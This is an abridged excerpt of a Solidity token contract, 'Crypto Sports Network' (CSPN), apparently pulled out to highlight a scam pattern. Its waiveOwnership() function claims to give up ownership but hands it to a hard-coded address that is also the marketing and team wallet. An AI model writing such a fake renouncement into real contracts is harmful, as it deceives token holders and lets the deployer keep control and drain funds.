...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xAf39D66a5DCC1D46260f8396855722CfCD1aD00f);
    }
...
contract CryptoSportsNetwork is Context, IERC20, Ownable {
    ...
    string private _name = "Crypto Sports Network";
    string private _symbol = "CSPN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xAf39D66a5DCC1D46260f8396855722CfCD1aD00f);
    address payable public teamWalletAddress = payable(0xAf39D66a5DCC1D46260f8396855722CfCD1aD00f);
